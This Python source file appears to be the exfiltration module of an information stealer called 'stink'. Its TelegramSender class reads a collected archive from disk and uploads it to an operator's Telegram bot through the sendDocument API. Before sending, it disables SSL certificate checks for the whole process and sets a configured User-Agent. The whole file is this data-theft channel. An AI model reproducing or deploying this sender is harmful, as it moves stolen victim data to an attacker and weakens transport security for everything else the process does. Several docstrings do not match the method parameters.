from urllib.request import Request, urlopen

import ssl
from abc import abstractmethod
from typing import Tuple, Union

from stink.helpers.config import SenderConfig
from stink.helpers import MultipartFormDataEncoder


class AbstractSender:
    """
    Template for the sender.
    """

    def __init__(self):
        self.__zip_name = None
        self.__data = None
        self.__preview = None

        self._config = SenderConfig()
        self._encoder = MultipartFormDataEncoder()

    @abstractmethod
    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of data.
        """
        ...

    @abstractmethod
    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ...

    @staticmethod
    def _create_unverified_https():
        """
        Disables SSL certificate validation.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ssl._create_default_https_context = ssl._create_unverified_context

    @abstractmethod
    def run(self, file_path: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        ...


class TelegramSender(AbstractSender):
    """
    Sender for the Telegram.
    """

    def __init__(self, token: str, user_id: int):
        super().__init__()

        self.__token = token
        self.__user_id = user_id
        self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and Telegram api url.
        """
        content_type, body = self._encoder.encode(
            [("chat_id", self.__user_id)],
            [("document", self.__zip_name, self.__data)]
        )

        return content_type, body

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data()
        query = Request(method="POST", url=self.__url, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, file_path: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - file_path [str]: Path to the file to be sent.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """

        self.__data = open(file_path, "rb")
        self.__zip_name = file_path

        try:
            self._create_unverified_https()
            self.__send_archive()
        except Exception as e:
            print(f"[Telegram sender]: {repr(e)}")
